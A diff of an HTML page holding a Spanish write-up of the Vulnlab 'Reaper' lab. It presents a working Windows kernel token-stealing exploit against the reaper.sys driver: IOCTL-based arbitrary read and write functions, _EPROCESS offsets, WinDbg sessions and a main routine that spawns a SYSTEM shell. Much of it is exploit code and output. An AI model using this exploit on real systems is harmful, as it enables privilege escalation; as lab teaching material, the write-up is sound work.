     userData.SrcAddress </span><span class="o">= </span><span class="p">what;
     userData.DstAddress </span><span class="o">=</span><span class="p"> where;
 
-    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryRead</code> es parecida pero solo recibe como argumento donde queremos leer, como destino de <code class="language-plaintext highlighter-rouge">COPY</code> establecemos la referencia a un <code class="language-plaintext highlighter-rouge">qword</code> llamado <code class="language-plaintext highlighter-rouge">output</code> que es el valor que se retorna luego de llamar a las funciones</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryRead</code> es parecida pero solo recibe como argumento donde queremos leer, como destino de <code class="language-plaintext highlighter-rouge">COPY</code> establecemos la referencia a un <code class="language-plaintext highlighter-rouge">qword</code> llamado <code class="language-plaintext highlighter-rouge">output</code> que es el valor que se retorna luego de llamar a las funciones.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {  
+<code><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
     </span><span class="na">QWORD</span><span class="p"> output;
     ReaperData userData;
 
@@ -1057,7 +1046,7 @@ PS C:\driver></span>
     userData.SrcAddress </span><span class="o">= </span><span class="p">where;
     userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
 
-    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 
@@ -1065,21 +1054,21 @@ PS C:\driver></span>
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En la máquina que se va a depurar habilitaremos el modo debug y en los ajustes haremos que se conecte al debugger por el puerto <code class="language-plaintext highlighter-rouge">50000</code> con la key <code class="language-plaintext highlighter-rouge">1.1.1.1</code></p>
+<p class="plain-text">En la máquina que se va a depurar habilitaremos el modo debug y en los ajustes haremos que se conecte al debugger por el puerto <code class="language-plaintext highlighter-rouge">50000</code> con la key <code class="language-plaintext highlighter-rouge">1.1.1.1</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">C:\Windows\system32></span><span class="am"> bcdedit</span><span class="p"> /debug on
 The operation completed successfully.
 
-C:\Windows\system32></span><span class="am"> bcdedit</span><span class="p"> /dbgsettings net hostip:192.168.100.5 port:50000 key:1.1.1.1  
+C:\Windows\system32></span><span class="am"> bcdedit</span><span class="p"> /dbgsettings net hostip:192.168.100.5 port:50000 key:1.1.1.1
 Key=1.1.1.1
 
 C:\Windows\system32></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En la máquina debugger ejecutaremos WinDbg y en la pestaña <code class="language-plaintext highlighter-rouge">Attach to kernel</code>, añadimos el puerto y la key que especificamos antes en la máquina a depurar</p>
+<p class="plain-text">En la máquina debugger ejecutaremos WinDbg y en la pestaña <code class="language-plaintext highlighter-rouge">Attach to kernel</code>, añadimos el puerto y la key que especificamos antes en la máquina a depurar.</p>
 <a href="/vulnlab/reaper/32.png" target="_blank"><div><p><img src="/vulnlab/reaper/32.png"></p></div></a>
 
-<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">sc</code> podemos iniciar el driver <code class="language-plaintext highlighter-rouge">reaper.sys</code> como un servicio en el kernel</p>
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">sc</code> podemos iniciar el driver <code class="language-plaintext highlighter-rouge">reaper.sys</code> como un servicio en el kernel.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">C:\driver> </span><span class="am">sc</span><span class="p"> create Reaper binPath=C:\driver\reaper.sys type=kernel
 [SC] CreateService SUCCESS
@@ -1092,7 +1081,7 @@ C:\driver> </span><span class="am">sc</span><span class="p"> start Reaper
 SERVICE_NAME: Reaper
         TYPE               : 1  KERNEL_DRIVER
         STATE              : 4  RUNNING
-                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)  
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
         WIN32_EXIT_CODE    : 0  (0x0)
         SERVICE_EXIT_CODE  : 0  (0x0)
         CHECKPOINT         : 0x0
@@ -1103,7 +1092,7 @@ SERVICE_NAME: Reaper
 C:\driver></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Finalmente solo necesitamos reiniciar la máquina a depurar y automáticamente se conectara al debugger, podemos ejecutar <code class="language-plaintext highlighter-rouge">g</code> para dejar que arranque con normalidad</p>
+<p class="plain-text">Finalmente solo necesitamos reiniciar la máquina a depurar y automáticamente se conectara al debugger, podemos ejecutar <code class="language-plaintext highlighter-rouge">g</code> para que arranque con normalidad.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Connected to target 192.168.100.10 on port 50000 on local IP 192.168.100.5.
 You can get the target MAC address by running .kdtargetmac command.
@@ -1111,7 +1100,7 @@ Kernel Debugger connection established.  (Initial Breakpoint requested)
 
 ************* Path validation summary **************
 Response                         Time (ms)     Location
-Deferred                                       SRV*c:\symbols*http://msdl.microsoft.com/download/symbols  
+Deferred                                       SRV*c:\symbols*http://msdl.microsoft.com/download/symbols
 Symbol search path is: SRV*c:\symbols*http://msdl.microsoft.com/download/symbols
 Executable search path is:
 Windows 10 Kernel Version 19045 MP (2 procs) Free x64
@@ -1123,51 +1112,51 @@ fffff800`56420b10 cc              int     3
 </span><span class="ro">0: kd></span><span class="p"> g</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos comprobar que se cargó listando el módulo <code class="language-plaintext highlighter-rouge">reaper</code> desde el debugger</p>
+<p class="plain-text">Podemos comprobar que se cargó listando el módulo <code class="language-plaintext highlighter-rouge">reaper</code> desde el debugger.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd></span><span class="p"> lm m reaper
 Browse full module list
 start             end                 module name
-fffff800`64790000 fffff800`64797000   reaper     (deferred)  </span>
+fffff800`64790000 fffff800`64797000   reaper     (deferred)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En windows existe un proceso llamado <code class="language-plaintext highlighter-rouge">SYSTEM</code> al cual le pertenece el pid <code class="language-plaintext highlighter-rouge">4</code>, este alberga la mayoria de subprocesos del sistema en modo kernel, dado que alberga la ejecución del código en modo kernel que está en un contexto de altos privilegios</p>
+<p class="plain-text">En windows existe un proceso llamado <code class="language-plaintext highlighter-rouge">SYSTEM</code> al cual le pertenece el pid <code class="language-plaintext highlighter-rouge">4</code>, este alberga la mayoria de subprocesos del sistema en modo kernel, dado que alberga la ejecución del código en modo kernel que está en un contexto de altos privilegios.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd> </span><span class="p">!process 0 0 System
 PROCESS ffffba09b847a040
     SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
-    DirBase: 001ae000  ObjectTable: ffffe0006c085000  HandleCount: 1993.  
+    DirBase: 001ae000  ObjectTable: ffffe0006c085000  HandleCount: 1993.
     Image: System</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La dirección que nos otorga el primer resultado es la de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, entre los atributos de la estructura en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> encontramos lo primero interesante para nuestro shellcode, esto es el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso</p>
+<p class="plain-text">La dirección que nos otorga el primer resultado es la de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, entre los atributos de la estructura en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> encontramos lo primero interesante para nuestro shellcode, esto es el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffffba09b847a040 Token
    +0x4b8 Token : _EX_FAST_REF
 
 </span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffffba09b847a040 + 0x4b8
-   +0x000 Object           : 0xffffe000`6c04c045 Void  
+   +0x000 Object           : 0xffffe000`6c04c045 Void
    +0x000 RefCnt           : 0y0101
    +0x000 Value            : 0xffffe000`6c04c045</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Otros campos bastante interesantes son <code class="language-plaintext highlighter-rouge">UniqueProcessId</code> en el offset <code class="language-plaintext highlighter-rouge">0x440</code> que guarda el pid del proceso y el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> en el offset <code class="language-plaintext highlighter-rouge">0x448</code> que es una estructura doblemente enlazada que apunta al <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del siguiente proceso</p>
+<p class="plain-text">Otros campos bastante interesantes son <code class="language-plaintext highlighter-rouge">UniqueProcessId</code> en el offset <code class="language-plaintext highlighter-rouge">0x440</code> que guarda el pid del proceso y el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> en el offset <code class="language-plaintext highlighter-rouge">0x448</code> que es una estructura doblemente enlazada que apunta al <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del siguiente proceso.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffffba09b847a040 UniqueProcessId
    +0x440 UniqueProcessId : 0x00000000`00000004 Void
 
 </span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffffba09b847a040 ActiveProcessLinks
-   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffffba09`b855d4c8 - 0xfffff807`66c26360 ]  </span>
+   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffffba09`b855d4c8 - 0xfffff807`66c26360 ]</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Los offsets de la estructura pueden cambiar en las diferentes versiones de windows, para la versión especifica que corre la máquina victima tenemos estos offsets</p>
+<p class="plain-text">Los offsets de la estructura pueden cambiar en las diferentes versiones de windows, para la versión especifica que corre la máquina victima tenemos estos offsets.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">#define</span><span class="na"> OFFSET_Token</span><span class="mi"> 0x4b8
 </span><span class="o">#define</span><span class="na"> OFFSET_UniqueProcessId</span><span class="mi"> 0X440
-</span><span class="o">#define</span><span class="na"> OFFSET_ActiveProcessLinks</span><span class="mi"> 0x448  </span>
+</span><span class="o">#define</span><span class="na"> OFFSET_ActiveProcessLinks</span><span class="mi"> 0x448</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">GetKernelBase</code> obtiene la dirección base del kernel con <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code>, la función <code class="language-plaintext highlighter-rouge">GetSystemEProcess</code> carga el binario <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>, luego obtiene la dirección relativa al bloque de datos del proceso de <code class="language-plaintext highlighter-rouge">System</code>, finalmente calcula la dirección sumando el offset a la dirección base del kernel y lee el <code class="language-plaintext highlighter-rouge">_EPROCESS</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">GetKernelBase</code> obtiene la dirección base del kernel con <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code>, la función <code class="language-plaintext highlighter-rouge">GetSystemEProcess</code> carga el binario <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>, luego obtiene la dirección relativa al bloque de datos del proceso de <code class="language-plaintext highlighter-rouge">System</code>, finalmente calcula la dirección sumando el offset a la dirección base del kernel y lee el <code class="language-plaintext highlighter-rouge">_EPROCESS</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
     </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
@@ -1179,8 +1168,8 @@ PROCESS ffffba09b847a040
 
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
     </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
-    
-    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);  
+
+    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
     </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
     </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;
 
@@ -1191,7 +1180,7 @@ PROCESS ffffba09b847a040
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La funcion <code class="language-plaintext highlighter-rouge">GetCurrentEProcess</code> recibe como argumento el <code class="language-plaintext highlighter-rouge">systemEProcess</code> y a partir de ahi en bucle recorre la lista doblemente enlazada <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code>, compara si el pid del <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es igual al del proceso actual y si es asi retorna la dirección</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">GetCurrentEProcess</code> recibe como argumento el <code class="language-plaintext highlighter-rouge">systemEProcess</code> y a partir de ahi en bucle recorre la lista doblemente enlazada <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code>, compara si el pid del <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es igual al del proceso actual y si es asi retorna la dirección.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="na">QWORD GetCurrentEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> systemEProcess</span><span class="p">) {
     </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> systemEProcess;
@@ -1199,7 +1188,7 @@ PROCESS ffffba09b847a040
 
     </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
         </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
-        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);  
+        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);
 
         currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;
 
@@ -1212,10 +1201,10 @@ PROCESS ffffba09b847a040
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> explota un <a href="/exploit-development/windows-kernel/token-stealing">Token Stealing</a>, obtiene las direcciones de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del proceso de <code class="language-plaintext highlighter-rouge">System</code> y la del proceso actual, luego escribe en la dirección del campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso System, con el fin de comprobar el funcionamiento establecemos varios <code class="language-plaintext highlighter-rouge">printf</code> y un <code class="language-plaintext highlighter-rouge">getchar</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> explota un <a href="/exploit-development/windows-kernel/token-stealing">Token Stealing</a>, obtiene las direcciones de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del proceso de <code class="language-plaintext highlighter-rouge">System</code> y la del proceso actual, luego escribe en la dirección del campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso System, a fin de comprobar el funcionamiento establecemos varios <code class="language-plaintext highlighter-rouge">printf</code> y un <code class="language-plaintext highlighter-rouge">getchar</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="no">int</span><span class="na"> main</span><span class="p">() {
-    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  
+    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
 
     </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">==</span><span class="p"> INVALID_HANDLE_VALUE) {
         </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
@@ -1241,28 +1230,28 @@ PROCESS ffffba09b847a040
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit llega al <code class="language-plaintext highlighter-rouge">getchar</code> muestra 3 direcciones de memoria con <code class="language-plaintext highlighter-rouge">printf</code></p>
+<p class="plain-text">Al ejecutar el exploit llega al <code class="language-plaintext highlighter-rouge">getchar</code> muestra 3 direcciones de memoria con <code class="language-plaintext highlighter-rouge">printf</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\exploit.exe</span><span class="p">
 [*] Kernel Base: 0xfffff80009e07000
 [*] System _EPROCESS: 0xffff910748cba040
-[*] Current _EPROCESS: 0xffff91074edd5080  </span>
+[*] Current _EPROCESS: 0xffff91074edd5080</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La primera dirección es la base del kernel que podemos ver como el módulo <code class="language-plaintext highlighter-rouge">nt</code></p>
+<p class="plain-text">La primera dirección es la base del kernel que podemos ver como el módulo <code class="language-plaintext highlighter-rouge">nt</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd></span><span class="p"> lm m nt
 Browse full module list
 start             end                 module name
-fffff800`09e07000 fffff800`0ae4e000   nt         (pdb symbols)  </span>
+fffff800`09e07000 fffff800`0ae4e000   nt         (pdb symbols)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Las otras 2 direcciones apuntal a la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de 2 procesos, el primero es de <code class="language-plaintext highlighter-rouge">System</code> y el segundo de nuestro exploit, en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> podemos ver sus valores del campo <code class="language-plaintext highlighter-rouge">Token</code>, hasta ahora todo es normal y cada uno es diferente</p>
+<p class="plain-text">Las otras 2 direcciones apuntal a la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de 2 procesos, el primero es de <code class="language-plaintext highlighter-rouge">System</code> y el segundo de nuestro exploit, en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> podemos ver sus valores del campo <code class="language-plaintext highlighter-rouge">Token</code>, hasta ahora todo es normal y cada uno es diferente.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff910748cba040 ImageFileName  
+<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff910748cba040 ImageFileName
    +0x5a8 ImageFileName : [15]  "System"
 
-</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff91074edd5080 ImageFileName  
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffff91074edd5080 ImageFileName
    +0x5a8 ImageFileName : [15]  "exploit.exe"
 
 </span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff910748cba040 + 0x4b8 Value
@@ -1272,31 +1261,31 @@ fffff800`09e07000 fffff800`0ae4e000   nt         (pdb symbols)  </span>
    +0x000 Value : 0xffffb701`a205281f</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Establecemos un breakpoint en el <code class="language-plaintext highlighter-rouge">mov</code> del driver y al llegar a el podemos ver guarda en <code class="language-plaintext highlighter-rouge">rax</code> el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code>, luego lo mueve como el contenido del registro <code class="language-plaintext highlighter-rouge">rcx</code> que apunta a la dirección donde se encuentra el <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual</p>
+<p class="plain-text">Establecemos un breakpoint en el <code class="language-plaintext highlighter-rouge">mov</code> del driver y al llegar a el podemos ver guarda en <code class="language-plaintext highlighter-rouge">rax</code> el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code>, luego lo mueve como el contenido del registro <code class="language-plaintext highlighter-rouge">rcx</code> que apunta a la dirección donde se encuentra el <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd></span><span class="p"> bp Reaper + 0x10be
 
 </span><span class="ro">0: kd></span><span class="p"> g
 Breakpoint 0 hit
 Reaper+0x10be:
-fffff800`101b10be 488b00          mov     rax,qword ptr [rax]  
+fffff800`101b10be 488b00          mov     rax,qword ptr [rax]
 
 </span><span class="ro">0: kd></span><span class="p"> dqs rax L1
 ffff9107`48cba4f8  ffffb701`9c04c047
 
 </span><span class="ro">0: kd></span><span class="p"> p
 Reaper+0x10c1:
-fffff800`101b10c1 488901          mov     qword ptr [rcx],rax  
+fffff800`101b10c1 488901          mov     qword ptr [rcx],rax
 
 </span><span class="ro">0: kd></span><span class="p"> dqs rcx L1
 ffff9107`4edd5538  ffffb701`a205281f</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al final de la ejecución ambos procesos tienen el mismo <code class="language-plaintext highlighter-rouge">Token</code>, y al proceso actual tener el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> deberia obtener tambien sus privilegios</p>
+<p class="plain-text">Al final de la ejecución ambos procesos tienen el mismo <code class="language-plaintext highlighter-rouge">Token</code>, y al proceso actual tener el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> deberia obtener también sus privilegios.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0: kd></span><span class="p"> p
 Reaper+0x10c4:
-fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)  
+fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
 
 </span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffff910748cba040 + 0x4b8 Value
    +0x000 Value : 0xffffb701`9c04c047
@@ -1305,7 +1294,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
    +0x000 Value : 0xffffb701`9c04c047</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, nuestro exploit a través de las funciones de los códigos <code class="language-plaintext highlighter-rouge">ioctl</code> escribe el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> en el proceso actual, luego ejecuta <code class="language-plaintext highlighter-rouge">system("cmd.exe")</code> que al ejecutarlo nos devuelve una shell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<p class="plain-text">Entonces, nuestro exploit a través de las funciones de los códigos <code class="language-plaintext highlighter-rouge">ioctl</code> escribe el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> en el proceso actual, luego ejecuta <code class="language-plaintext highlighter-rouge">system("cmd.exe")</code> que al ejecutarlo nos devuelve una shell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">#include</span><span class="s"> &ltwindows.h>
 </span><span class="o">#include</span><span class="s"> &ltstdio.h>
@@ -1339,7 +1328,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
     userData.SrcAddress </span><span class="o">= </span><span class="p">what;
     userData.DstAddress </span><span class="o">=</span><span class="p"> where;
